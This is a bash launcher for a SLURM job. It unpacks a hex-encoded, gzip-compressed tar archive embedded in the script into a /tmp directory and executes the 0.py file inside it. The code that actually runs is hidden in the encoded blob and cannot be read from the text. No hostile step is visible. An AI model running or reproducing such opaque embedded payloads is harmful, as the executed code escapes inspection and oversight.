#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d6fdb300c867bf6af1072910d048afceda4c871f71db65d86a290653a569ad886a4accd86fdf74976506428b05bdb0de37388225b7c4991a2ccd9de0cfdcdabc21d05e7d3c85f8e3c4db3e7fff3f3a22cca1bc25f37ac9993b1423b976fe1eb2fe4c7c20e0fd02f3664216a1e2769961765b55e2cc96214e7c3209a7bd389242ffc8a2ace8aa6cc652b642d20292181362bf3ac9679d534b28a455ce6c93a4e6a5964ebb696690e20aa625d25b28c9bfc5ab53e5b304e34cf382fe3d8bf3988feda595964552333de5449da8a92b7ebb62d0a8006d6508aa458a7a2c800d2386baa2ccdb98ba8924959d74d9d8aa45afc7cefdcfe0b70369e5fddc79ffb3f8ee317fd9f6529f6ff5ba08ee3a02d3167b3f41f8265274c7750f5d225a55507085a3d1cc928ac7f482e8b3fba69a0b77e089d21137af7ed6b7c17ddcaadd760bebf4d18ea15e5d3d785464c836b790b4f368ca240cca67435ea610fd2aee4703c9e7a65cfabfdfe0ca77e47a395fc4aa79b89de7919bbfb4e03610c38f79710d97c558462169fee13a7ce3a786ad40e8c73b5dd3a95dfaf317a173c2adb91cbfed830421f8a880843ec2620eda00910d54f13a25ad20f9600ebc511983f28d678eb900e5a764237f75dcc5734dac8a1b7aa3fc1b58d32de411811274919a35e75daf72c17b1d1cb6db45006c8177138c107ad071dd2cfbd11ad0f623c591a39c971eb5239d2d56c783b7a4be82d3b3e344a87f3c46c3fe9132ce149197b3f3c4cb3c82d7dd4cac2253996b9026821ed1418cc55f105f145f43566aaf7190ef9d2581d4e4edddbe9085c6d98ed87e7a37014aa0ffc4fa8a3e0bdcf3282200882200882200882200882200882200882200882fcaffc02f46e700800280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
